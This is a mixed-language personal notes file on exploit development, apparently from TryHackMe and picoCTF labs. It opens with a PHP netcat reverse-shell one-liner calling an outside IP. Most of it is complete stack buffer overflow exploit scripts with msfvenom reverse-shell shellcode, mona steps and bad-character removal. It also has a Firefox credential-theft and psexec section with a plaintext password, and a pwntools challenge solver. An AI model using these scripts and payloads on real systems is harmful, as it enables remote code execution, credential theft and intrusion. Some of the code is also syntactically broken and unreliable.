@@ -1,0 +1,658 @@
+reverse shell :
+<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
+
+open Immunit debugger  ; 
+CPU (désassemblage des instructions)
+Registers (affichage des registres)
+Stack (pointeurs et données de la pile)
+
+Fuzzing
+Create a file on your Kali box called fuzzer.py with the following contents:
+
+#!/usr/bin/env python3
+
+import socket, time, sys
+
+ip = "10.10.248.84"
+
+port = 1337
+timeout = 5
+prefix = "OVERFLOW1 "
+
+string = prefix + "A" * 100
+
+while True:
+  try:
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+      s.settimeout(timeout)
+      s.connect((ip, port))
+      s.recv(1024)
+      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
+      s.send(bytes(string, "latin-1"))
+      s.recv(1024)
+  except:
+    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
+    sys.exit(0)
+  string += 100 * "A"
+  time.sleep(1)
+
+
+Run the fuzzer.py script using python: python3 fuzzer.py
+//////////////////////////////
+open immunity deb  + choice app open  click f9 to run immunity deb go to kali run script  ************************
+Crash Replication & Controlling EIP
+﻿Create another file on your Kali box called exploit.py with the following contents:
+
+import socket
+
+ip = "10.10.248.84"
+port = 1337
+
+prefix = "OVERFLOW1 "
+offset = 0
+overflow = "A" * offset
+retn = ""
+padding = ""
+payload = ""
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending evil buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
+except:
+  print("Could not connect.")
+
+
+
+///////////////////////////////////////////code  : 
+cat exploit.py 
+#!/usr/bin/env python3
+
+import socket
+import sys
+
+try:
+    # Initialisation de la socket
+    s = socket.socket()
+    
+    # Connexion au serveur (adresse IP et port)
+    s.connect(("10.10.208.183", 1337))
+    
+    # Réception initiale de données depuis le serveur
+    s.recv(1024)
+
+    # Création du payload avec un buffer overflow
+    payload = b"OVERFLOW1 " + b"A" * 2000
+    
+    # Envoi du payload au serveur
+    s.send(payload)
+
+    # Fermeture de la connexion
+    s.close()
+
+except Exception as e:
+    # Gestion des erreurs (si la connexion échoue)
+    print(f"Cannot connect to the server: {e}")
+    sys.exit(1)
+
+/////////step 2 
+/////////// pattern_create.rb -l 5000  
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
+
+il nous donne un code de bad caracters 
+coppier them and paste in  the payload
+   replace this  in the code a la place de A *2000
+   restart immunity deb + f9 run + run the script +go to immunity deb 
+ 
+////////////step 3 
+
+
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2000 -q 6F43396E         (6F43396E it is the EIP address )
+
+
+
+///i need to get shell code  : 
+malicieux code 
+!mona    
+i need to jump from EIP to ESP 
+!mona jmp -r esp
+selectionne un jump address
+for exemple 0x625011af
+restart Immunity deb and run  and select the none after jmp and ctrl+g and coller 625011af ok + go to this address and f2 or toggle 
+restart also and run + run the script and as we can see the address of EIP is be changed to 625011af  so in the ESP CCCCCCC we need a malicieux code 
+create a payload   : msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f py
+buf =  b""
+buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
+buf += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
+buf += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
+buf += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
+buf += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
+buf += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
+buf += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
+buf += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
+buf += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
+buf += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
+buf += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
+buf += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
+buf += b"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
+buf += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
+buf += b"\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
+buf += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x02"
+buf += b"\x02\x5a\x68\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56"
+buf += b"\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
+buf += b"\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
+buf += b"\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
+buf += b"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
+buf += b"\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
+buf += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
+buf += b"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
+buf += b"\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
+buf += b"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
+buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
+
+this code have a bad characters so  we need to delete all bad characters from my payload 
+go google   : 
+badchars github
+badchars = (
+  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
+  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
+  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
+  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
+  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
+  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
+  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
+  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
+  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
+  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
+  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
+  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
+  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
+  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
+  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+)
+
+coppier and paste to my code  and add b to all lignes ********
+and remoove b"c"*100 add in the payload badchars 
+
+so whe see the bad caracters 00 0102030405060A so for ex 07 and 08  (\0x07 \0x08 ) are bad characters so we need to delete them from payload 
+
+
+so we need create another payload 
+msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f py -b "\0x07\0x08\0x2e\0x2f\0xa0\0xa1\0x00"        no space 
+buf =  b""
+buf += b"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e"
+buf += b"\x81\x76\x0e\x1d\x97\x80\x2d\x83\xee\xfc\xe2\xf4"
+buf += b"\xe1\x7f\x02\x2d\x1d\x97\xe0\xa4\xf8\xa6\x40\x49"
+buf += b"\x96\xc7\xb0\xa6\x4f\x9b\x0b\x7f\x09\x1c\xf2\x05"
+buf += b"\x12\x20\xca\x0b\x2c\x68\x2c\x11\x7c\xeb\x82\x01"
+buf += b"\x3d\x56\x4f\x20\x1c\x50\x62\xdf\x4f\xc0\x0b\x7f"
+buf += b"\x0d\x1c\xca\x11\x96\xdb\x91\x55\xfe\xdf\x81\xfc"
+buf += b"\x4c\x1c\xd9\x0d\x1c\x44\x0b\x64\x05\x74\xba\x64"
+buf += b"\x96\xa3\x0b\x2c\xcb\xa6\x7f\x81\xdc\x58\x8d\x2c"
+buf += b"\xda\xaf\x60\x58\xeb\x94\xfd\xd5\x26\xea\xa4\x58"
+buf += b"\xf9\xcf\x0b\x75\x39\x96\x53\x4b\x96\x9b\xcb\xa6"
+buf += b"\x45\x8b\x81\xfe\x96\x93\x0b\x2c\xcd\x1e\xc4\x09"
+buf += b"\x39\xcc\xdb\x4c\x44\xcd\xd1\xd2\xfd\xc8\xdf\x77"
+buf += b"\x96\x85\x6b\xa0\x40\xff\xb3\x1f\x1d\x97\xe8\x5a"
+buf += b"\x6e\xa5\xdf\x79\x75\xdb\xf7\x0b\x1a\x68\x55\x95"
+buf += b"\x8d\x96\x80\x2d\x34\x53\xd4\x7d\x75\xbe\x00\x46"
+buf += b"\x1d\x68\x55\x7d\x4d\xc7\xd0\x6d\x4d\xd7\xd0\x45"
+buf += b"\xf7\x98\x5f\xcd\xe2\x42\x17\x47\x18\xff\x8a\x2f"
+buf += b"\x1f\xcd\xe8\x2f\x1d\x86\xdc\xa4\xfb\xfd\x90\x7b"
+buf += b"\x4a\xff\x19\x88\x69\xf6\x7f\xf8\x98\x57\xf4\x21"
+buf += b"\xe2\xd9\x88\x58\xf1\xff\x70\x98\xbf\xc1\x7f\xf8"
+buf += b"\x75\xf4\xed\x49\x1d\x1e\x63\x7a\x4a\xc0\xb1\xdb"
+buf += b"\x77\x85\xd9\x7b\xff\x6a\xe6\xea\x59\xb3\xbc\x2c"
+buf += b"\x1c\x1a\xc4\x09\x0d\x51\x80\x69\x49\xc7\xd6\x7b"
+buf += b"\x4b\xd1\xd6\x63\x4b\xc1\xd3\x7b\x75\xee\x4c\x12"
+buf += b"\x9b\x68\x55\xa4\xfd\xd9\xd6\x6b\xe2\xa7\xe8\x25"
+buf += b"\x9a\x8a\xe0\xd2\xc8\x2c\x70\x98\xbf\xc1\xe8\x8b"
+buf += b"\x88\x2a\x1d\xd2\xc8\xab\x86\x51\x17\x17\x7b\xcd"
+buf += b"\x68\x92\x3b\x6a\x0e\xe5\xef\x47\x1d\xc4\x7f\xf8"
+
+*****************************************
+
+
+cat  exploit.py
+#!/usr/bin/env python3
+
+import socket
+import sys
+buf =  b""
+buf += b"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e"
+buf += b"\x81\x76\x0e\x1d\x97\x80\x2d\x83\xee\xfc\xe2\xf4"
+buf += b"\xe1\x7f\x02\x2d\x1d\x97\xe0\xa4\xf8\xa6\x40\x49"
+buf += b"\x96\xc7\xb0\xa6\x4f\x9b\x0b\x7f\x09\x1c\xf2\x05"
+buf += b"\x12\x20\xca\x0b\x2c\x68\x2c\x11\x7c\xeb\x82\x01"
+buf += b"\x3d\x56\x4f\x20\x1c\x50\x62\xdf\x4f\xc0\x0b\x7f"
+buf += b"\x0d\x1c\xca\x11\x96\xdb\x91\x55\xfe\xdf\x81\xfc"
+buf += b"\x4c\x1c\xd9\x0d\x1c\x44\x0b\x64\x05\x74\xba\x64"
+buf += b"\x96\xa3\x0b\x2c\xcb\xa6\x7f\x81\xdc\x58\x8d\x2c"
+buf += b"\xda\xaf\x60\x58\xeb\x94\xfd\xd5\x26\xea\xa4\x58"
+buf += b"\xf9\xcf\x0b\x75\x39\x96\x53\x4b\x96\x9b\xcb\xa6"
+buf += b"\x45\x8b\x81\xfe\x96\x93\x0b\x2c\xcd\x1e\xc4\x09"
+buf += b"\x39\xcc\xdb\x4c\x44\xcd\xd1\xd2\xfd\xc8\xdf\x77"
+buf += b"\x96\x85\x6b\xa0\x40\xff\xb3\x1f\x1d\x97\xe8\x5a"
+buf += b"\x6e\xa5\xdf\x79\x75\xdb\xf7\x0b\x1a\x68\x55\x95"
+buf += b"\x8d\x96\x80\x2d\x34\x53\xd4\x7d\x75\xbe\x00\x46"
+buf += b"\x1d\x68\x55\x7d\x4d\xc7\xd0\x6d\x4d\xd7\xd0\x45"
+buf += b"\xf7\x98\x5f\xcd\xe2\x42\x17\x47\x18\xff\x8a\x2f"
+buf += b"\x1f\xcd\xe8\x2f\x1d\x86\xdc\xa4\xfb\xfd\x90\x7b"
+buf += b"\x4a\xff\x19\x88\x69\xf6\x7f\xf8\x98\x57\xf4\x21"
+buf += b"\xe2\xd9\x88\x58\xf1\xff\x70\x98\xbf\xc1\x7f\xf8"
+buf += b"\x75\xf4\xed\x49\x1d\x1e\x63\x7a\x4a\xc0\xb1\xdb"
+buf += b"\x77\x85\xd9\x7b\xff\x6a\xe6\xea\x59\xb3\xbc\x2c"
+buf += b"\x1c\x1a\xc4\x09\x0d\x51\x80\x69\x49\xc7\xd6\x7b"
+buf += b"\x4b\xd1\xd6\x63\x4b\xc1\xd3\x7b\x75\xee\x4c\x12"
+buf += b"\x9b\x68\x55\xa4\xfd\xd9\xd6\x6b\xe2\xa7\xe8\x25"
+buf += b"\x9a\x8a\xe0\xd2\xc8\x2c\x70\x98\xbf\xc1\xe8\x8b"
+buf += b"\x88\x2a\x1d\xd2\xc8\xab\x86\x51\x17\x17\x7b\xcd"
+buf += b"\x68\x92\x3b\x6a\x0e\xe5\xef\x47\x1d\xc4\x7f\xf8"
+
+try:
+    # Initialisation de la socket
+    s = socket.socket()
+    
+    # Connexion au serveur (adresse IP et port)
+    s.connect(("10.10.235.136", 1337))
+    
+    # Réception initiale de données depuis le serveur
+    s.recv(1024)
+
+    # Création du payload avec un buffer overflow
+    payload = b"OVERFLOW1 " + b"A"*1978 + b"\xaf\x11\x50\x62" +b"\x90"*16 + buf
+    # Envoi du payload au serveur
+    s.send(payload)
+
+    # Fermeture de la connexion
+    s.close()
+
+except Exception as e:
+    # Gestion des erreurs (si la connexion échoue)
+    print(f"Cannot connect to the server: {e}")
+    sys.exit(1)
+
+
+
+****************************************
+Bytes en Big-Endian ou Little-Endian :
+////step 4 
+convert en Little-Endian  ; 
+this is the code  : 
+********************************************
+# Adresse en hexadécimal (big-endian)
+address = 0x625011af
+
+# Conversion en bytes (little-endian)
+little_endian = address.to_bytes(4, byteorder='little')
+
+print(little_endian)  # Résultat : b'\xaf\x11\x50\x62'
+*********************************************
+Les architectures comme x86 utilisent le Little-Endian. Cela signifie que les bytes sont stockés à l'envers :
+0x625011af devient en bytes \xaf\x11\x50\x62.
+Il est crucial d’envoyer les valeurs de manière correcte, sinon vous risquez d'écraser les registres avec des adresses invalides.
+
+
+
+
+//////step 5 
+
+
+the last code  
+#!/usr/bin/env python3
+import socket
+
+ip = "10.10.235.136"
+port = 1337
+prefix = b"OVERFLOW1 "  # Mettre en bytes
+offset = 1978
+overflow = b"A" * offset  # Mettre en bytes
+retn = b"\xaf\x11\x50\x62"  # Mettre en bytes
+padding = b"\x90" * 16  # Mettre en bytes
+
+# Payload en bytes
+payload = (
+    b"\xbb\xfc\xb5\xd2\x1b\xdd\xc2\xd9\x74\x24\xf4\x5f\x31\xc9"
+    b"\xb1\x52\x83\xef\xfc\x31\x5f\x0e\x03\xa3\xbb\x30\xee\xa7"
+    b"\x2c\x36\x11\x57\xad\x57\x9b\xb2\x9c\x57\xff\xb7\x8f\x67"
+    b"\x8b\x95\x23\x03\xd9\x0d\xb7\x61\xf6\x22\x70\xcf\x20\x0d"
+    b"\x81\x7c\x10\x0c\x01\x7f\x45\xee\x38\xb0\x98\xef\x7d\xad"
+    b"\x51\xbd\xd6\xb9\xc4\x51\x52\xf7\xd4\xda\x28\x19\x5d\x3f"
+    b"\xf8\x18\x4c\xee\x72\x43\x4e\x11\x56\xff\xc7\x09\xbb\x3a"
+    b"\x91\xa2\x0f\xb0\x20\x62\x5e\x39\x8e\x4b\x6e\xc8\xce\x8c"
+    b"\x49\x33\xa5\xe4\xa9\xce\xbe\x33\xd3\x14\x4a\xa7\x73\xde"
+    b"\xec\x03\x85\x33\x6a\xc0\x89\xf8\xf8\x8e\x8d\xff\x2d\xa5"
+    b"\xaa\x74\xd0\x69\x3b\xce\xf7\xad\x67\x94\x96\xf4\xcd\x7b"
+    b"\xa6\xe6\xad\x24\x02\x6d\x43\x30\x3f\x2c\x0c\xf5\x72\xce"
+    b"\xcc\x91\x05\xbd\xfe\x3e\xbe\x29\xb3\xb7\x18\xae\xb4\xed"
+    b"\xdd\x20\x4b\x0e\x1e\x69\x88\x5a\x4e\x01\x39\xe3\x05\xd1"
+    b"\xc6\x36\x89\x81\x68\xe9\x6a\x71\xc9\x59\x03\x9b\xc6\x86"
+    b"\x33\xa4\x0c\xaf\xde\x5f\xc7\xda\x1c\x5d\x4d\xb3\x22\x61"
+    b"\x70\xf8\xaa\x87\x18\xee\xfa\x10\xb5\x97\xa6\xea\x24\x57"
+    b"\x7d\x97\x67\xd3\x72\x68\x29\x14\xfe\x7a\xde\xd4\xb5\x20"
+    b"\x49\xea\x63\x4c\x15\x79\xe8\x8c\x50\x62\xa7\xdb\x35\x54"
+    b"\xbe\x89\xab\xcf\x68\xaf\x31\x89\x53\x6b\xee\x6a\x5d\x72"
+    b"\x63\xd6\x79\x64\xbd\xd7\xc5\xd0\x11\x8e\x93\x8e\xd7\x78"
+    b"\x52\x78\x8e\xd7\x3c\xec\x57\x14\xff\x6a\x58\x71\x89\x92"
+    b"\xe9\x2c\xcc\xad\xc6\xb8\xd8\xd6\x3a\x59\x26\x0d\xff\x79"
+    b"\xc5\x87\x0a\x12\x50\x42\xb7\x7f\x63\xb9\xf4\x79\xe0\x4b"
+    b"\x85\x7d\xf8\x3e\x80\x3a\xbe\xd3\xf8\x53\x2b\xd3\xaf\x54"
+    b"\x7e"
+)
+
+postfix = b""  # En bytes
+
+# Concaténation correcte en bytes
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+try:
+    s.connect((ip, port))
+    print("Sending evil buffer...")
+    s.send(buffer + b"\r\n")  # Envoi en bytes
+    print("Done!")
+except Exception as e:
+    print(f"Could not connect: {e}")
+
+
+    ***********another code   Fuzzing.py************************
+    #!/usr/bin/env python3
+
+import socket
+import time
+import sys
+
+ip = "10.2.2.90"  # Adresse IP de la cible
+port = 1337        # Port de la cible
+timeout = 5
+
+buffer = []  # Liste pour stocker les chaînes de test
+counter = 100  # Début de la taille du buffer
+
+# Remplir la liste avec des chaînes de taille croissante
+while len(buffer) < 30:
+    buffer.append("A" * counter)
+    counter += 100
+
+# Envoyer chaque chaîne au serveur
+for string in buffer:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        
+        # Connexion à la cible
+        s.connect((ip, port))
+        s.recv(1024)  # Lecture de la bannière ou de la réponse initiale
+
+        print(f"Fuzzing with {len(string)} bytes")
+
+        # Envoi de la charge utile
+        payload = "OVERFLOW1 " + string + "\r\n"
+        s.send(payload.encode('latin-1'))  # Encodage en bytes
+
+        s.recv(1024)  # Lecture de la réponse
+        s.close()  # Fermeture de la connexion
+
+    except Exception as e:
+        print(f"Could not connect to {ip}:{port} - {e}")
+        sys.exit(0)
+
+    time.sleep(1)  # Pause d'une seconde entre les tests
+
+***********another code   Exploit.py************************
+import socket
+
+ip = "10.10.235.136"  # Adresse IP de la cible
+port = 1337            # Port de la cible
+
+prefix = "OVERFLOW2 "   # Préfixe attendu par le serveur
+offset = 0              # Taille du débordement (à ajuster selon l'exploit)
+overflow = "A" * offset # Création de la charge de débordement
+retn = ""               # Adresse de retour (à trouver plus tard)
+padding = ""            # Espace pour le NOP sled (\x90 * 16 par exemple)
+payload = ""            # Shellcode (à ajouter plus tard)
+postfix = ""            # Contenu additionnel si nécessaire
+
+# Construction du buffer final
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+# Initialisation du socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+    # Connexion au serveur cible
+    s.connect((ip, port))
+    print("Sending evil buffer...")
+
+    # Envoi du buffer via le socket
+    s.send((buffer + "\r\n").encode('latin-1'))  # Encodage en bytes
+
+    print("Done!")
+    s.close()  # Fermeture du socket
+
+except Exception as e:
+    print(f"Could not connect: {e}")
+
+
+/////////////
+OVERFLOW2
+
+replace OV1 by OV2
+msf-pattern_create -l 700
+and add this in payload 
+!mona findmsp -distance 700
+and see in mona what is the offset of EIP for ex  : 634
+so we need to chnge the offset from exploit.py with 634  
+mona bytearray -b "\x00"
+
+\x00\x11\x40\x5f\xb8\xee\ef
+***********script****************
+00 16 17 2f 30 f4 f5 fd
+\x00\x16\x2f\xf4\xfd
+open kali 
+# Génère une séquence d'octets de \x01 à \xff
+for x in range(1, 256):
+    print("\\x{:02x}".format(x), end='')
+
+print()  # Ajoute une nouvelle ligne à la fin
+
+\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
+coller to the payload 
+open debugger restart and run puis run the script 
+puis coppier the address of ESP 01ABFA30
+!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
+msf-pattern_offset -l 700 -b 76413176
+
+
+
+
+**********************************************************
+i need to create a short video simple in Linkedin ...in this video , i will share with you a simple exemple of Buffer Overflow attack ...the objectif is crash the eip and ....  so first we need to open the Immunity debbuger and open the application that we need to crsh them and we have 4 pages Assembly and registers like ESP EBP EIP in the bottom we have data in stack ..and in the left the memory dump lets start to fuzzing add the ip and port of target  and after run the script ..the apk stop running after sending 1100 bytes   ..so the next step is create a 1100 bytes with msfpattern coppier them  ..open the exploit script with nano and paste in payload ...restart and run again immunity dbbuger the programme is stoped  to see the offset we need to  run mona findmsp -distance 1100....and the offset in EIP  is 1034  lets add this value to the exploit script also add BBBB to see this in EIPand delete the payload run script and ass we can see the EIP is 42424242 that mean BBBB .......next step is finding bad characters ...so lets generate ascript 00 to ff  coppier this and paste in the exploit.py ...........mona compare and paste the ESP address ..ESP follow in dump and weget the bad carachters so you need to delete them ...next we need to finding a jump point  mona jump the register ESP and paste the bad characters...choose an address for exepmple this ..625011f7 and convert them to little endian by reversing the place of all caracters ...copier and  paste them to the payload ...the final step is to create  a payload  with msfvenom and just add the lhost and lport 443 and  -b the bad caracters      ...... but we need to going to script and add \x90 *a number to test after doing this coppier the payload and paste them in the script ...run netcat whith the same port 443 restart the immunity debbuger run the application ...and run our script and finnaly you got  a reverse shell   
+
+
+"Hi everyone! In this video, I’ll share a simple example of a Buffer Overflow attack. The goal is to crash the EIP and gain control over the application.
+
+First, open Immunity Debugger and load the target application.
+
+Immunity has four main parts:
+Assembly
+Registers like ESP, EBP, and EIP
+Stack Data at the bottom
+Memory Dump on the left
+Let’s start fuzzing!
+
+Add the target's IP and port, run the fuzzing script, and the application stops after receiving 1100 bytes.
+Next step:
+
+Create 1100 bytes with msf-pattern, copy it, and open the exploit script with nano. Paste the pattern as the payload.
+Restart Immunity Debugger, rerun the application, and run the script.
+
+The program crashes, and we now check the offset:
+Run: !mona findmsp -distance 1100
+EIP offset is 1034.
+
+or methode 2   is 
+msf create chhal mabghiti + run script + chof EIP address chddha coppier w sir dir msf offset -l dak l3adad li drti -q EIP_address w ghadi y3tik l offset 
+Update the exploit script with the offset value, replace the payload with BBBB, and restart the debugger. If the EIP shows 42424242, it means our payload is working.
+Find bad characters:
+
+Generate a byte array from \x00 to \xFF, paste it into the exploit script, and rerun.
+Use !mona compare with the ESP address. Check for bad characters in ESP via Memory Dump and remove them from the byte array.
+Find a jump point:
+
+Run: !mona jmp -r esp
+Choose an address, for example, 625011f7, and convert it to little-endian (reverse the order). Paste it into the payload in your exploit script.
+Create the final payload:
+
+Use msfvenom:
+bash
+Copier le code
+msfvenom -p windows/shell_reverse_tcp LHOST=<your IP> LPORT=443 -b "<bad chars>" -f python
+Add NOPs (\x90) for padding and copy the payload into your script.
+Run Netcat on port 443, restart Immunity Debugger, run the application, and execute the script.
+
+Result: You’ll get a reverse shell successfully!"
+
+
+
+priv esc  : 
+
+
+In Desktop i found Firefox.Ink
+
+Firefox.lnk this is shortcut icon thats meaning this machine have firefox browser
+
+
+This module will collect credentials from the Firefox web browser if it is installed on the targeted machine. Additionally, cookies are downloaded. Which could potentially yield valid web sessions. Firefox stores passwords within the signons.sqlite database file. There is also a keys3.db file which contains the key for decrypting these passwords. In cases where a Master Password has not been set, the passwords can easily be decrypted using 3rd party tools or by setting the DECRYPT option to true.
+
+msf6 exploit(multi/handler) > use post/multi/gather/firefox_creds
+
+exploit
+
+We will decrypt this using a firefox decrypt tool
+
+https://github.com/unode/firefox_decrypt
+We will now use psexec.py to connect to the server.
+
+https://github.com/fortra/impacket/blob/master/examples/psexec.py
+
+python3 psexec.py mayor:8CL7O1N78MdrCIsV@10.10.74.127
+
+
+
+
+
+////special cas 0badchars
+
+
+if we dont have any bad characters 
+cd /usr/share/metasploit-framework/tools/exploit   
+                                                                                                
+┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit]
+└─$ ls
+egghunter.rb     find_badchars.rb      metasm_shell.rb   pattern_create.rb  random_compile_c.rb
+exe2vba.rb       install_msf_apk.sh    msf_irb_shell.rb  pattern_offset.rb  reg.rb
+exe2vbs.rb       java_deserializer.rb  msu_finder.rb     pdf2xdp.rb         virustotal.rb
+extract_msu.bat  jsobfu.rb             nasm_shell.rb     psexec.rb
+                                                                                                
+┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit]
+└─$ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb            
+nasm > jmp esp
+00000000  FFE4              jmp esp
+nasm > 
+
+
+
+
+!mona find -s "\xff\xe4"
+
+choose the address li fih kolchi false false false dirlo coppier  7wwlo l litle indiann safe hadak howa li atzido f3wt BBBB mn b3d restart and cherche ctrl G wlla f2 m3rftch chercher atl3 lik enter expression to follow w coller the address 
+
+
+run script w chof EIP wllat fih dkchui 
+
+create payload -b "\x00"
+msfconsole use multi/handler set lhost set lport set payload windows/shell_reverse_tcp    wlkin ila kan target linux khtar payload dyal linux  !:  linux/x86/shell_reverse_tcp
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+////////////////code 1 
+
+python -c 'import sys; sys.stdout.buffer.write(b"\x32\x0a" + (b"\x41" * 32 ) + (b"\xa0\x11\x40\x00\x0a\x34\x0a")' | ./chall
+
+
+
+/////////////////code 2 
+
+from pwn import *
+context.log_level = 'debug' 
+elf=context.binary=ELF('./chall')
+# context(terminal=['tmux', 'splitw', '-h'])
+#io = gdb.debug('./chall', 'continue')
+io = remote ('tethys .picoctf.net', 56850)
+io.readuntil('Enter your choice:')
+
+offset = 0xD0 - 0xB0 + 1
+# the d0 is the finl 2 bit of bico and 0b is the final 2  bit of pico 
+io.sendline('2')
+io. readuntil('Data for buffer:') io.sendline (offset* 'A')
+io. readuntil('Enter your choice:') io.sendline ('4')
+io.interactive()
+
+
+
+
+
+
+
+
+
+
+
+T1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd
+
+
+./vuln
